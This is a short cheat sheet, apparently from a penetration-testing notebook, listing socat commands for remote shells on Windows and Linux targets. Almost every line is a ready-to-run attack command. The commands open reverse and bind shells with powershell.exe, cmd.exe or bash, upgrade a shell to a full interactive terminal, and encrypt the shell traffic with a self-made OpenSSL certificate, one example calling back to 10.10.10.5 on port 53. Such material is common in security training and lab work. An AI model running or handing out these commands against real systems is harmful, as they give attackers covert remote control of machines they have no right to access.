# Socat

**Reverse Shell**

* On attacking machine
  * `socat TCP-L:<port> -`
* On target
  * Windows
    * `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
  * Linux
    * `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

**Bind** **Shell**

* On attacking machine
  * `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
* On target
  * Windows
    * `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
  * Linux
    * `socat TCP-L:<PORT> EXEC:"bash -li"`

**Features**

* Stable Reverse shell in Linux
  * On attacking machine
    * ``socat TCP-L: FILE:`tty`,raw,echo=0``
  * On target
    * `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

![socat reverse shell](<../../../.gitbook/assets/image (2).png>)

**Socat Encrypted Shells**

* Generate cert
* `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
* `cat shell.key shell.crt > shell.pem`
* Reverse Shell
  * On attacking machine
    * `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
    * `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0`
  * On target
    * `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
    * `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
* Bind Shell
  * On attacking machine
    * `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
  * On target
    * `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

![openssl reverse shell](<../../../.gitbook/assets/image (4).png>)
